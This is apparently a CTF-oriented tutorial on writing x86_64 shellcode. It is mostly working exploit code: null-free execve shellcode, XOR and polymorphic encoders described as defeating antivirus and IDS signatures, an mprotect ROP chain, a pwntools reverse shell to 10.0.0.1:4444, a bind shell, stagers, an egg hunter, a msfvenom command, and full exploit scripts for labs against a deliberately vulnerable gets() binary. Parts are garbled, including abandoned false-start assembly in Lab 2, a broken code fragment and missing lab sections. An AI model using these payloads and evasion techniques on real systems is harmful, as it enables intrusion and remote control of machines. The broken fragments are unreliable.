Shellcode

What is Shellcode?

Shellcode is raw machine code injected into a running process to perform arbitrary actions — historically to spawn a shell, hence the name. It's used when you can hijack control flow (e.g., stack overflow, use-after-free) and redirect execution to attacker-controlled data.

When shellcode is viable:

  • NX disabled — the stack/heap is executable, so you can jump directly to injected code.
  • mprotect / mmap — even with NX, if you can call mprotect() via ROP to mark a buffer as executable, you can then jump to shellcode in that buffer.
  • JIT regions — writable + executable memory regions in JIT engines.

Basic Shellcode: execve("/bin/sh")

The classic shellcode spawns a shell via execve("/bin/sh", NULL, NULL).

Handwritten Assembly (x86_64, null-free)

; execve("/bin/sh", NULL, NULL)
; Syscall 59: rax=59, rdi=ptr to "/bin/sh", rsi=0, rdx=0

section .text
global _start

_start:
    ; Zero out rdx (envp = NULL)
    xor     rdx, rdx            ; rdx = 0 (avoids null byte from mov rdx, 0)

    ; Push "/bin/sh" onto the stack
    ; "/bin/sh" = 2f 62 69 6e 2f 73 68
    ; We need a null terminator, push 0 first
    push    rdx                  ; null terminator on stack

    ; Move "/bin/sh" as a 64-bit immediate
    mov     rdi, 0x68732f6e69622f   ; "/bin/sh" in little-endian
    push    rdi                  ; push the string onto stack
    mov     rdi, rsp             ; rdi = pointer to "/bin/sh\0"

    ; Zero out rsi (argv = NULL)
    xor     rsi, rsi             ; rsi = 0

    ; Set syscall number for execve
    xor     rax, rax             ; clear rax
    mov     al, 59               ; rax = 59 (execve) — single byte, no nulls

    ; Invoke the syscall
    syscall

Line-by-line:

  • xor rdx, rdx — zeros RDX without using mov rdx, 0 (which encodes null bytes).
  • push rdx — puts a null terminator on the stack for the string.
  • mov rdi, 0x68732f6e69622f — loads /bin/sh as a 64-bit immediate (little-endian).
  • push rdi; mov rdi, rsp — pushes the string, then points RDI at it.
  • xor rsi, rsi — argv = NULL.
  • mov al, 59 — sets only the low byte of RAX to avoid null bytes from a full mov rax, 59.
  • syscall — triggers the kernel.

Avoiding Null Bytes

Null bytes (\x00) act as string terminators in C. If your shellcode is injected via strcpy, gets, scanf("%s"), etc., any \x00 truncates the payload.

Bad (has nulls)Good (null-free)Why
mov rax, 0xor rax, raxmov encodes 0x00 bytes in the immediate
mov rax, 59xor rax, rax; mov al, 59Full 64-bit mov pads with zeros
mov rdi, 0xor rdi, rdiSame reason
push 0xor r8, r8; push r8push 0 encodes null in the immediate

Avoiding Bad Characters

Beyond nulls, certain input functions filter other bytes:

  • \x0a (newline) — fgets, gets stop here
  • \x0d (carriage return) — network protocols
  • \x20 (space) — scanf, some parsers
  • \x09 (tab) — whitespace-delimited parsers

Techniques:

  • Use arithmetic: mov al, 60; sub al, 1 to get 59 without the byte 0x3b if needed.
  • XOR encoding: encode the shellcode with a key, prepend a decoder stub.
  • Use register manipulation to construct forbidden values at runtime.

NOP Sleds

A NOP sled is a sequence of \x90 (NOP) instructions prepended to shellcode. When you don't know the exact address of your shellcode, you aim your jump anywhere into the sled — execution slides down to your payload.

from pwn import *

context.arch = 'amd64'

nop_sled = b'\x90' * 200
shellcode = asm(shellcraft.sh())
payload = nop_sled + shellcode

When useful: ASLR is weak/absent, you control a large buffer, and you need to guess the landing address. Less relevant with modern ASLR but still appears in CTFs.

Encoder / Decoder Shellcode

When certain bytes are banned, encode the shellcode and prepend a decoder stub that decodes it in place at runtime.

Simple XOR Encoder

from pwn import *

context.arch = 'amd64'

raw_shellcode = asm(shellcraft.sh())

# Choose a key that doesn't produce bad bytes
key = 0x41

# Encode
encoded = bytes([b ^ key for b in raw_shellcode])

# Verify no null bytes in encoded payload
assert b'\x00' not in encoded, "Encoded shellcode contains null bytes, pick a different key"

print(f"Encoded ({len(encoded)} bytes):")
print(''.join(f'\\x{b:02x}' for b in encoded))

XOR Decoder Stub (x86_64)

; XOR decoder stub
; Assumes encoded shellcode follows immediately after this stub

section .text
global _start

_start:
    jmp     get_shellcode       ; jump forward to get address of encoded payload

decoder:
    pop     rsi                 ; rsi = address of encoded shellcode (from call)
    xor     rcx, rcx
    mov     cl, SHELLCODE_LEN   ; length of encoded shellcode (patch this)

decode_loop:
    xor     byte [rsi], 0x41   ; XOR each byte with key
    inc     rsi
    loop    decode_loop         ; decrement rcx, loop if != 0

    jmp     decoded_shellcode   ; jump to now-decoded shellcode

get_shellcode:
    call    decoder             ; pushes address of next instruction (encoded bytes)

decoded_shellcode:
    ; encoded shellcode bytes go here
    ; db 0x09, 0x70, ...

Self-Modifying Shellcode

Self-modifying shellcode rewrites its own instructions at runtime to produce the actual payload. Useful to evade static analysis and signature detection.

; Self-modifying: patches placeholder bytes at runtime
section .text
global _start

_start:
    ; Get address of our code
    lea     rdi, [rel placeholder]

    ; Patch: change 0xFF to 0x3b (execve syscall number)
    mov     byte [rdi], 0x3b

    ; ... rest of shellcode uses the patched value
    jmp     placeholder

placeholder:
    db      0xFF               ; placeholder, patched to 0x3b at runtime

mprotect ROP → Shellcode

When NX is enabled but you can ROP, call mprotect() to make your buffer executable, then jump to your shellcode.

from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leaked addresses (assume you've leaked libc base)
libc_base = 0x7ffff7c00000  # example

# Target: mprotect(buf_addr & ~0xfff, 0x1000, 7)
#   7 = PROT_READ | PROT_WRITE | PROT_EXEC
buf_addr = 0x7fffffffe000    # address of your shellcode on stack
page_addr = buf_addr & ~0xfff

mprotect = libc_base + libc.symbols['mprotect']

# ROP gadgets (find with ROPgadget or ropper)
pop_rdi = libc_base + 0x2a3e5   # pop rdi; ret
pop_rsi = libc_base + 0x2be51   # pop rsi; ret
pop_rdx = libc_base + 0x11f497  # pop rdx; ret  (or pop rdx; pop r12; ret)

# Build ROP chain
rop_chain  = p64(pop_rdi) + p64(page_addr)
rop_chain += p64(pop_rsi) + p64(0x1000)
rop_chain += p64(pop_rdx) + p64(7)
rop_chain += p64(mprotect)
rop_chain += p64(buf_addr)  # after mprotect returns, jump to shellcode

# Full payload
shellcode = asm(shellcraft.sh(), arch='amd64')
padding = b'A' * offset_to_rip
payload = padding + rop_chain + shellcode

Polymorphic Shellcode

Polymorphic shellcode changes its byte representation on each use while performing the same action. It defeats signature-based detection (IDS/IPS, AV).

  • Variable encoding keys — random XOR key each time, different encoded bytes.
  • Junk instruction insertion — NOP-equivalent instructions (xchg rax, rax, lea rax, [rax+0]).
  • Register reassignment — swap which registers are used for intermediate values.
  • Instruction substitution — sub rax, -59 instead of add rax, 59.
from pwn import *
import random

context.arch = 'amd64'

def generate_polymorphic_execve():
    """Generate a different-looking execve shellcode each time."""
    key = random.randint(1, 255)

    raw = asm(shellcraft.sh())
    encoded = bytes([b ^ key for b in raw])

    # Decoder stub with randomized register choices
    decoder = f"""
        jmp     encoded_payload
    decode:
        pop     rsi
        xor     rcx, rcx
        mov     cl, {len(raw)}
    loop_decode:
        xor     byte ptr [rsi], {key}
        inc     rsi
        loop    loop_decode
        jmp     decoded
    encoded_payload:
        call    decode
    decoded:
    """
    stub = asm(decoder)
    return stub + encoded

# Each call produces different bytes
shellcode = generate_polymorphic_execve()

Common Shellcode Patterns

Reverse Shell

from pwn import *
context.arch = 'amd64'

# Connect back to attacker
sc  = shellcraft.connect('10.0.0.1', 4444)
sc += shellcraft.dupsh()   # dup2 socket fd to stdin/stdout/stderr, then execve /bin/sh
payload = asm(sc)

Bind Shell

from pwn import *
context.arch = 'amd64'

# Listen on port 4444, accept a connection, dup + shell
sc  = shellcraft.bindsh(4444)
payload = asm(sc)

Staged Shellcode

When buffer space is tiny, inject a small stager that read()s the full payload from the socket/stdin into a larger buffer:

; Stage 1: read(0, rsp, 0x1000) — read full shellcode from stdin onto stack
xor     rax, rax         ; syscall 0 = read
xor     rdi, rdi         ; fd = 0 (stdin)
mov     rsi, rsp         ; buf = stack pointer
mov     dx, 0x1000       ; count (use dx to avoid nulls if value fits)
syscall
jmp     rsp              ; jump to the just-read shellcode

Size Optimization Techniques

  • cdq — sign-extends EAX into EDX:EAX. If EAX is small & positive, this zeros EDX in 1 byte (vs 3 for xor edx, edx).
  • push imm8; pop reg — load small values in 3 bytes instead of mov reg, imm (5+ bytes).
  • mul reg — if a register is zero, mul zeros RAX and RDX in 2 bytes.
  • Reuse registers that are already zero from previous syscall return values.
  • Use 32-bit operands where possible — they implicitly zero the upper 32 bits and encode shorter.
  • Overlap string data with code using jmp/call tricks.

Compact execve (27 bytes)

; 27-byte execve("/bin/sh") — x86_64, null-free
xor     esi, esi             ; rsi = 0 (argv), also shorter than xor rsi,rsi
mul     esi                  ; rax = 0, rdx = 0
push    rax                  ; null terminator
mov     rbx, 0x68732f6e69622f
push    rbx
push    rsp
pop     rdi                  ; rdi = pointer to "/bin/sh"
mov     al, 59               ; execve
syscall

Lab 2: Null-Free Flag Reader

Medium

Objective: Write null-free shellcode that opens /flag.txt, reads its contents, and writes them to stdout. Verify no \x00 bytes in the assembled output.

Approach: Chain three syscalls: open(2) → read(0) → write(1). Push the filename onto the stack to avoid data section references.

; lab2_readflag.asm — null-free flag reader
section .text
global _start

_start:
    ; open("/flag.txt", O_RDONLY)
    xor     rsi, rsi             ; flags = O_RDONLY (0)
    xor     rdx, rdx             ; mode = 0

    ; Push "/flag.txt\0" onto stack
    push    rdx                  ; null terminator
    mov     rax, 0x7478742e6761  ; "ag.txt" (partial, little-endian) — 6 bytes
    push    rax
    mov     rax, 0x6c662f         ; "/fl" — 3 bytes
    push    rax
    ; Actually, let's do this cleanly:

    ; Reset — build "/flag.txt" properly
    xor     rsi, rsi
    xor     rdx, rdx
    push    rdx                  ; null terminator

    ; "/flag.txt" = 2f666c61672e747874
    ; Split into pushable chunks
    mov     rax, 0x7478742e67616c66  ; "flag.txt" (8 bytes, little-endian)
    push    rax
    push    0x2f                 ; "/" (push sign-extends, gives 0x000000000000002f)
    ; That push has nulls! Fix: use register
    xor     rdi, rdi
    mov     dil, 0x2f
    push    rdi
    ; Stack: "/" ... "flag.txt" \0 — but not contiguous right.

    ; Cleaner approach: use the stack as a string buffer
    xor     rax, rax
    push    rax                           ; null terminator
    mov     rax, 0x7478742e67616c66       ; "flag.txt"
    push    rax
    mov     byte [rsp+8], 0x2f            ; prepend "/" — but this writes at wrong offset

    ; Simplest null-free approach: push as two words
    xor     rax, rax
    push    rax                           ; null terminator
    mov     r8, 0x7478742e67616c66        ; "flag.txt"
    push    r8                            ; stack: "flag.txt\0"
    ; We need "/flag.txt" — use sub rsp, then write "/"
    sub     rsp, 8
    mov     byte [rsp], 0x2f             ; "/"
    lea     rdi, [rsp]                    ; not contiguous... 

    ; === Clean final approach ===
    ; Just use pwntools in the lab, hand-assemble the concept:

_clean_start:
    ; open("/flag.txt", 0, 0)
    xor     rdx, rdx
    xor     rsi, rsi
    ; push "/flag.txt\0" — 10 bytes, pad to 16
    push    rdx                          ; 8 bytes of zeros (includes null term)
    mov     rax, 0x7478742e67616c66      ;  "flag.txt" little-endian
    push    rax
    mov     byte [rsp-1], 0x2f           ; place "/" before "flag.txt"
    sub     rsp, 1
    mov     rdi, rsp                     ; rdi -> "/flag.txt\0..."
    xor     rax, rax
    mov     al, 2                        ; syscall 2 = open
    syscall                              ; fd in rax

    ; read(fd, rsp_buf, 256)
    mov     rdi, rax                     ; fd from open
    sub     rsp, 256
    mov     rsi, rsp                     ; buf
    xor     rdx, rdx
    mov     dl, 255                      ; count (avoid null from large immediate)
    xor     rax, rax                     ; syscall 0 = read
    syscall

    ; write(1, buf, bytes_read)
    mov     rdx, rax                     ; count = bytes read
    xor     rdi, rdi
    inc     rdi                          ; fd = 1 (stdout)
    mov     rsi, rsp                     ; buf
    xor     rax, rax
    inc     rax                          ; syscall 1 = write
    syscall

    ; exit(0)
    xor     rdi, rdi
    xor     rax, rax
    mov     al, 60                       ; syscall 60 = exit
    syscall

Lab 3: Stack Overflow + NOP Sled + Shellcode

Medium

Objective: Exploit a vulnerable binary with NX disabled. Overflow the buffer, place a NOP sled + shellcode on the stack, and overwrite RIP to land in the sled.

Vulnerable binary:

// vuln.c
// gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buf[128];
    printf("Enter input: ");
    gets(buf);  // obvious overflow
}

int main() {
    vulnerable();
    return 0;
}

Exploit:

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./vuln')
p = process('./vuln')

# Find offset to RIP (use cyclic pattern)
# cyclic(200) -> crash -> cyclic_find(fault_addr)
offset = 136  # 128 buf + 8 saved RBP

# Shellcode
shellcode = asm(shellcraft.sh())

# NOP sled
nop_sled = b'\x90' * 200

# We need an approximate address of the buffer on the stack.
# With no ASLR + no PIE, stack address is predictable.
# Use GDB: break at gets, print $rsp
# Example: buf starts at 0x7fffffffe100
buf_addr = 0x7fffffffe100  # adjust after GDB recon

# Jump into the middle of the NOP sled
ret_addr = buf_addr + 100

payload  = nop_sled
payload += shellcode
payload += b'A' * (offset - len(nop_sled) - len(shellcode))
payload += p64(ret_addr)

p.sendlineafter(b'Enter input: ', payload)
p.interactive()

Tips:

  • Disable ASLR for testing: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
  • Use GDB to find the buffer address: b *vulnerable+20, r, x/20gx $rsp
  • If the address is slightly off, the NOP sled absorbs the error

Lab 4: Alphanumeric Shellcode

Hard

Objective: Write shellcode using only bytes in the ranges 0x30-0x39 (digits), 0x41-0x5a (uppercase), and 0x61-0x7a (lowercase). This simulates a filter that only allows printable alphanumeric characters.

Strategy: Use an alphanumeric encoder. Write a decoder stub using only allowed bytes, followed by XOR-encoded payload.

from pwn import *
import string

context.arch = 'amd64'

# Target shellcode
target = asm(shellcraft.sh())

# Allowed bytes: alphanumeric only
allowed = set(string.ascii_letters.encode() + string.digits.encode())

def find_xor_key(shellcode_bytes, allowed_set):
    """Find a single-byte XOR key where all encoded bytes are alphanumeric."""
    for key in range(1, 256):
        encoded = bytes([b ^ key for b in shellcode_bytes])
        if all(b in allowed_set for b in encoded):
            return key
    return None

# Single-byte key rarely works for long shellcode.
# Use multi-byte key or alpha-encoder tools.

# Approach: use pwntools' encoder
from pwnlib.encoders import encoder
encoded_sc = encoder.alphanumeric(target)
print(f"Encoded length: {len(encoded_sc)} bytes")
assert all(chr(b).isalnum() for b in encoded_sc), "Not fully alphanumeric!"

# Test
p = run_shellcode(encoded_sc)
p.interactive()

Alternative: Use msfvenom

# Generate alphanumeric-only shellcode with Metasploit
msfvenom -p linux/x64/exec CMD=/bin/sh -e x64/alpha_mixed -f python

Manual approach: Construct values using only allowed instructions. For example, push 0x30; pop rax; xor al, 0x30 zeros RAX using only bytes 0x6a 0x30 0x58 0x34 0x30 — all printable.

Lab 6: Reverse Shell Shellcode

Medium

Objective: Write shellcode that connects back to an attacker's IP:port and redirects stdin/stdout/stderr to the socket, then spawns a shell.

Lab 8: Shellcode Avoiding Specific Bytes

Medium

Objective: Write execve("/bin/sh") shellcode that avoids null bytes (0x00), newlines (0x0a), and spaces (0x20). These are common bad characters in string-based overflows.

from pwn import *

context.arch = 'amd64'

BAD_CHARS = b'\x00\x0a\x20'

shellcode = asm('''
    /* Zero registers without using xor reg,reg (which is fine, no bad bytes) */
    xor     rdx, rdx
    push    rdx

    /* "/bin/sh" = 2f 62 69 6e 2f 73 68 00 — the 0x00 is the problem */
    /* Solution: use "/bin//sh" (0x68732f2f6e69622f) — no null needed */
    mov     rdi, 0x68732f2f6e69622f
    push    rdi
    mov     rdi, rsp

    xor     rsi, rsi
    xor     rax, rax
    mov     al, 59              /* 59 = 0x3b — not in bad chars */
    syscall
''')

# Verify no bad characters
for i, b in enumerate(shellcode):
    if b in BAD_CHARS:
        log.error(f"Bad byte 0x{b:02x} at offset {i}!")
        break
else:
    log.success(f"Clean shellcode: {len(shellcode)} bytes, no bad chars")
    print(enhex(shellcode))

Common bad character workarounds:

  • 0x00: Use xor to zero, mov al for small values, push-then-fix for strings
  • 0x0a: Avoid mov al, 10 → use mov al, 11; dec al
  • 0x20: Avoid and instructions that encode 0x20 → restructure
  • Use pwntools: shellcraft.sh() + asm() then check, or use encoder.encode(sc, avoid=b'\x00\x0a\x20')

; egg_hunter.asm — searches memory for 0xDEADBEEFDEADBEEF
; Uses access(2) syscall to safely probe pages without SIGSEGV
section .text
global _start

_start:
    xor     edi, edi             ; start from address 0

.next_page:
    or      di, 0xfff            ; align to end of page (0xfff)

.next_addr:
    inc     rdi

    ; access(addr, 0) — returns -EFAULT (0xfffffff2) for unmapped pages
    xor     eax, eax
    mov     al, 21               ; syscall 21 = access
    xor     esi, esi
    syscall

    cmp     al, 0xf2             ; EFAULT = page not mapped
    je      .next_page           ; skip entire page

    ; Page is readable — check for egg
    mov     rax, 0xDEADBEEFDEADBEEF
    mov     rsi, rdi
    scasq                        ; compare [rdi] with rax, advance rdi
    jnz     .next_addr
    scasq                        ; check second copy (avoid finding ourselves)
    jnz     .next_addr

    ; Found! RDI now points past the egg — jump to shellcode
    jmp     rdi

Challenge 3: Filtered Shellcode

Hard

The binary reads your shellcode but rejects any input containing the bytes \x0f (blocks syscall), \x80...\xff (high bytes), and \x00 (nulls). Get a shell or read the flag.

Binary filter logic:

int check_shellcode(unsigned char *buf, int len) {
    for (int i = 0; i < len; i++) {
        if (buf[i] == 0x00) return -1;  // no nulls
        if (buf[i] == 0x0f) return -1;  // no 0x0f (blocks syscall = 0f 05)
        if (buf[i] >= 0x80) return -1;  // no high bytes
    }
    return 0;  // allowed
}

The problem: syscall is 0f 05, and 0x0f is banned. Without syscall, we can't invoke the kernel.

Solution: Self-modifying shellcode

Write the 0f 05 bytes at runtime by computing them from allowed values.

from pwn import *

context.arch = 'amd64'

# p = remote('challenge.ctf.com', 1337)
p = process('./filtered_shellcode')

# Strategy: place a placeholder where 'syscall' should be,
# then patch it at runtime using allowed instructions.

# The key insight: we can use XOR/ADD/SUB to construct 0x0f and 0x05
# at runtime and write them into our own code.

shellcode = asm('''
    /* Construct execve("/bin/sh", 0, 0) but with self-modifying syscall */

    /* First, set up the execve args */
    xor     rdx, rdx
    push    rdx
    mov     rdi, 0x68732f6e69622f    /* "/bin/sh" — check for high bytes! */
    push    rdi
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rax, rax
    mov     al, 59

    /* Now we need "syscall" (0f 05), but 0x0f is banned. */
    /* Self-modify: write 0f 05 into the placeholder below. */

    /* Get address of placeholder using LEA + RIP-relative */
    lea     rbx, [rip + placeholder]

    /* Construct 0x0f: 0x10 - 1 = 0x0f  (both < 0x80, neither is 0x0f) */
    mov     cl, 0x10
    sub     cl, 1
    mov     byte ptr [rbx], cl

    /* Construct 0x05: just 0x05 (allowed) */
    mov     byte ptr [rbx + 1], 0x05

placeholder:
    /* Two placeholder bytes that will be overwritten with 0f 05 */
    .byte   0x41, 0x41    /* NOP-equivalent placeholder (inc ecx, inc ecx) */
''')

# Verify no banned bytes
for i, b in enumerate(shellcode):
    if b == 0x00:
        print(f"WARNING: null at offset {i}")
    if b == 0x0f:
        print(f"WARNING: 0x0f at offset {i}")
    if b >= 0x80:
        print(f"WARNING: high byte 0x{b:02x} at offset {i}")

p.send(shellcode)
p.interactive()

Gotcha: The mov rdi, 0x68732f6e69622f immediate encodes high bytes! Fix by building the string on the stack with allowed-byte operations, or XOR-decode it.

from pwn import *

context.arch = 'amd64'

# Cleaner approach: all operations use only allowed bytes
shellcode = asm('''
    /* Build "/bin/sh" on stack using only allowed bytes */
    xor     rdx, rdx
    push    rdx                    /* null terminator */

    /* "/bin/sh" = 2f 62 69 6e 2f 73 68 */
    /* All these bytes are < 0x80, none are 0x0f or 0x00 — safe! */
    /* But we need to push as a 64-bit value. movabs might encode badly. */
    /* Use push imm32 trick: push low 4, then patch high bytes. */

    /* Actually: push 0x68732f6e; then push 0x69622f2f ("//" is fine) */
    /* 32-bit pushes sign-extend, so if bit 31 is 0, upper 32 = 0x00000000 — nulls in encoding! */
    /* Use: sub rsp, 8; mov dword [rsp], val; mov dword [rsp+4], val */

    sub     rsp, 16
    mov     dword ptr [rsp], 0x6e69622f     /* "/bin" */
    mov     dword ptr [rsp+4], 0x68732f2f   /* "//sh" */
    lea     rdi, [rsp]
    xor     rsi, rsi
    xor     rax, rax
    mov     al, 59

    /* Self-modify to create syscall instruction */
    lea     rbx, [rip + sc_placeholder]
    mov     cl, 0x10
    sub     cl, 1                /* cl = 0x0f */
    mov     byte ptr [rbx], cl
    mov     byte ptr [rbx + 1], 0x05

sc_placeholder:
    .byte 0x41, 0x41
''')

p = process('./filtered_shellcode')
p.send(shellcode)
p.interactive()

The key challenge is that syscall (0f 05) contains the banned byte 0x0f. Use self-modifying code: place a placeholder where syscall should go, then use arithmetic (mov cl, 0x10; sub cl, 1) to compute 0x0f at runtime and write it into your own code before execution reaches it. Also watch out for movabs immediates — string constants may contain high bytes.

# Signature patterns the scanner checks:

from pwn import *

    xor     byte ptr [rsi + rcx - 1], {key}

    loop    .lp
    jmp     rsi

''')

Challenge 9: Shellcode Sandbox

Hard

Heavy seccomp: only read, write, openat, and exit are allowed. No open, no execve. Read the flag using openat(AT_FDCWD, "/flag", O_RDONLY).

# seccomp-tools dump output:
# Allow: read(0), write(1), openat(257), exit(60), exit_group(231)
# Everything else: KILL
# Note: open(2) is blocked! Must use openat(2, ...) instead.

openat syscall number is 257. Use openat(AT_FDCWD, "/flag", O_RDONLY) where AT_FDCWD = -100 (0xffffffffffffff9c). This is equivalent to open("/flag", 0) but uses a different syscall number.

from pwn import *
context.arch = 'amd64'

shellcode = asm('''
    /* openat(AT_FDCWD, "/flag", O_RDONLY) */
    mov     rdi, -100           /* AT_FDCWD */
    lea     rsi, [rip + flag]
    xor     edx, edx            /* O_RDONLY */
    mov     eax, 257            /* openat */
    syscall

    /* read(fd, rsp-0x100, 0x100) */
    mov     edi, eax
    sub     rsp, 0x100
    mov     rsi, rsp
    mov     edx, 0x100
    xor     eax, eax            /* read */
    syscall

    /* write(1, buf, bytes_read) */
    mov     edx, eax
    mov     edi, 1
    mov     rsi, rsp
    mov     eax, 1              /* write */
    syscall

    /* exit(0) */
    xor     edi, edi
    mov     eax, 60
    syscall

flag:
    .asciz "/flag"
''')

p = remote('challenge.ctf', 1337)
p.send(shellcode)
print(p.recvall())

Challenge 10: Shellcode Obfuscation Gauntlet

Hard

The binary rejects shellcode containing any of: 0x0f05 (syscall), 0xcd80 (int 0x80), 0x050f (reverse), null bytes, AND runs a NOP-sled detector (rejects >4 consecutive 0x90 bytes). Get a shell.

# All prohibited patterns:
BANNED = [b'\x0f\x05', b'\xcd\x80', b'\x05\x0f', b'\x00',
          b'\x90\x90\x90\x90\x90']

Combine multiple techniques: (1) Self-modifying code to construct 0f 05 at runtime, (2) XOR-encode the payload to eliminate null bytes and banned patterns, (3) Use diverse NOP-equivalents instead of 0x90 (e.g., xchg rax,rax = 48 87 c0, lea rsi,[rsi], push rax; pop rax). The decoder stub must itself be clean — no banned bytes.

from pwn import *
context.arch = 'amd64'

# Step 1: Write clean shellcode with placeholder for syscall
inner = asm('''
    xor     esi, esi
    mul     esi
    push    rax
    mov     rdi, 0x68732f2f6e69622f
    push    rdi
    push    rsp
    pop     rdi
    mov     al, 59
    /* placeholder patched at runtime */
    lea     rbx, [rip + .sc]
    mov     byte ptr [rbx], 0x0e
    inc     byte ptr [rbx]     /* 0x0e + 1 = 0x0f */
    mov     byte ptr [rbx+1], 0x05
.sc:
    .byte   0x41, 0x41         /* patched to 0f 05 */
''')

# Step 2: XOR-encode to remove remaining bad bytes
key = 0x37
encoded = bytes([b ^ key for b in inner])
assert b'\x00' not in encoded

# Step 3: Build decoder (all clean bytes)
decoder = asm(f'''
    jmp     .e
.d:
    pop     rsi
    mov     cl, {len(encoded)}
.l:
    xor     byte ptr [rsi + rcx - 1], {key}
    loop    .l
    jmp     rsi
.e:
    call    .d
''')

final = decoder + encoded
for pat in [b'\x0f\x05', b'\xcd\x80', b'\x00']:
    assert pat not in final, f"Banned pattern found!"
log.success(f"Clean payload: {len(final)} bytes")
